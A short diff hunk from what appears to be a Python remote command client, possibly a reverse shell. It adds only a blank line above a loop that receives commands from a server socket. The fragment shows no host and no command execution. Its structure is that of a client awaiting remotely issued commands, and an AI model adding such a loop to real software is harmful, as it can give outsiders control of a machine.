@@ -15,6 +15,7 @@ print('[*] Server:', msg)
 print('Connection established')
 # Example for custom command, put your code in varName (you can change the name if you want)
 # varName = print('test')
+
 while True:
     cmd = s.recv(1024).decode()
     # print(f'[*] receive {cmd}')
